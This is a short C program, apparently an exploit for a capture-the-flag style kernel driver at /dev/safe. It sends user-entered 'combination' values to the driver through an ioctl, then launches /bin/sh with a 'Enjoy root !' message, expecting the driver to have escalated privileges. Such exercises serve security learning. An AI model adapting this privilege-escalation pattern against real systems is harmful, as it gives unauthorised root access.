#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <linux/types.h>
#include <linux/stat.h>
#include <unistd.h>
#include <linux/ioctl.h>
#include <fcntl.h>

/* IOCTL */
#define W_COMBINATION _IOW('x', 'w', int*)

int main()
{
    // File descriptor
    int fd;
    int32_t value, number;

    printf("Trying to open the device\n");
    fd = open("/dev/safe", O_RDWR);
    
    if (fd < 0)
    {
        printf("Couldn't open the device file !");
        return 1;
    }

    int i = 0;
    while (i < 3)
    {
	printf("Enter the combination :");
	scanf("%d", &number);
        printf("Writing value to driver\n");
        ioctl(fd, W_COMBINATION, (int32_t) number);
        ++i;
    }

    printf("Closing driver\n");
    close(fd);
    printf("Opening shell. Enjoy root ! \n");
    system("/bin/sh");

    exit(0);
}
